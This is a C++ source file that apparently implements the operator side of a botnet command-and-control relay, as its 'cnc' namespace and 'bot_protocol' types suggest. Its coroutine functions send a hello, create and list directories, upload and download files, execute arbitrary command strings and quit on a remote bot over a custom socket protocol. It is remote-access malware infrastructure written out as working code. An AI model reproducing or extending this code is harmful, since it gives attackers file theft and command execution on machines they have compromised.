#include "cmd_relay_send.h"
#include "serialize_filesystem.h"
#include "session.h"
using namespace cnc::common;

cmd_relay_send::awaitable_type<cmd_relay_send::hello_result> cmd_relay_send::hello(socket_type &socket, const bot_protocol::hello_data &msg)
{
	co_await session_type::send_msg(socket, cmd_relay_protocol::types::HELLO, serialize(msg));
	auto result = co_await recv_err_or_ok(socket);
	co_return result;
	co_return hello_result{false};
}

cmd_relay_send::awaitable_type<cmd_relay_send::create_directory_result> cmd_relay_send::create_directory(socket_type &socket, const std::filesystem::path &path)
{
	co_await session_type::send_msg(socket, cmd_relay_protocol::types::CREATE_DIRECTORY, path.string());
	co_return co_await recv_err_or_empty_ok(socket);
}

cmd_relay_send::awaitable_type<cmd_relay_send::list_directory_result> cmd_relay_send::list_directory(socket_type &socket, const std::filesystem::path &path)
{
	co_await session_type::send_msg(socket, cmd_relay_protocol::types::LIST_DIRECTORY, path.string());
	auto response = co_await recv_err_or_ok(socket);
	if (response.err)
		co_return list_directory_result{ false, response.err_msg };

	co_return list_directory_result{ false, "", common::deserialize<cmd_relay_protocol::directory_view>(response.msg) };
}

cmd_relay_send::awaitable_type<cmd_relay_send::recv_file_result> cmd_relay_send::recv_file(socket_type &socket, const std::filesystem::path &path, std::istream &in, header_type::size_type size)
{
	using types = cmd_relay_protocol::types;
	co_await session_type::send_msg(socket, types::RECV_FILE, serialize(path));
	auto result = co_await recv_err_or_empty_ok(socket);
	if (result.err)
		co_return recv_file_result{ true, result.err_msg };

	co_await session_type::send_stream(socket, types::BLOB, in, size);
	co_return recv_file_result{ false };
}

cmd_relay_send::awaitable_type<cmd_relay_send::send_file_result> cmd_relay_send::send_file(socket_type &socket, const std::filesystem::path &path, std::ostream &out)
{
	using types = cmd_relay_protocol::types;
	co_await session_type::send_msg(socket, types::SEND_FILE, serialize(path));
	auto result = co_await recv_err_or_empty_ok(socket);
	if (result.err)
		co_return send_file_result{ true, result.err_msg };

	auto response = co_await session_type::recv_header(socket);
	if (response.type() != types::BLOB)
		throw std::runtime_error("unexpected_message_error");

	co_await session_type::recv_stream(socket, out, response.payload_size());
	co_return send_file_result{ false };
}

cmd_relay_send::awaitable_type<cmd_relay_send::execute_result> cmd_relay_send::execute(socket_type &socket, const std::string &cmd)
{
	co_await session_type::send_msg(socket, cmd_relay_protocol::types::EXECUTE, cmd);
	auto result = co_await recv_err_or_ok(socket);
	co_return execute_result{ result.err, result.err_msg, result.msg };
}

cmd_relay_send::awaitable_type<cmd_relay_send::quit_result> cmd_relay_send::quit(socket_type &socket)
{
	auto result = co_await quit(socket, "");
	co_return result;
}

cmd_relay_send::awaitable_type<cmd_relay_send::quit_result> cmd_relay_send::quit(socket_type &socket, const std::string &msg)
{
	co_await session_type::send_msg(socket, cmd_relay_protocol::types::QUIT, msg);
	auto result = co_await recv_err_or_ok(socket);
	co_return result;
}

cmd_relay_send::awaitable_type<cmd_relay_send::err_or_empty_ok_result> cmd_relay_send::recv_err_or_empty_ok(socket_type &socket)
{
	auto response = co_await session_type::recv_header(socket);
	if (response.magic_byte() != cmd_relay_protocol::magic_byte)
		throw std::runtime_error("invalid magic byte received");

	using types = cmd_relay_protocol::types;
	switch (response.type())
	{
	case types::OK:
		if (response.payload_size() != 0)
			throw std::runtime_error("unexpected_message_error");

		co_return err_or_empty_ok_result{ false };

	case types::ERR:
	{
		auto msg = co_await session_type::recv_msg(socket, response.payload_size());
		co_return err_or_empty_ok_result{ true, msg };
	}
	}

	throw std::runtime_error("unexpected_message_error");
}

cmd_relay_send::awaitable_type<cmd_relay_send::err_or_ok_result> cmd_relay_send::recv_err_or_ok(socket_type &socket)
{
	auto response = co_await session_type::recv_header(socket);
	if (response.magic_byte() != cmd_relay_protocol::magic_byte)
		throw std::runtime_error("invalid magic byte received");

	using types = cmd_relay_protocol::types;
	switch (response.type())
	{
	case types::OK:
	{
		auto msg = co_await session_type::recv_msg(socket, response.payload_size());
		co_return err_or_ok_result{ false, "", msg };
	}
	case types::ERR:
	{
		auto msg = co_await session_type::recv_msg(socket, response.payload_size());
		co_return err_or_ok_result{ true, msg };
	}
	}

	throw std::runtime_error("unexpected_message_error");
}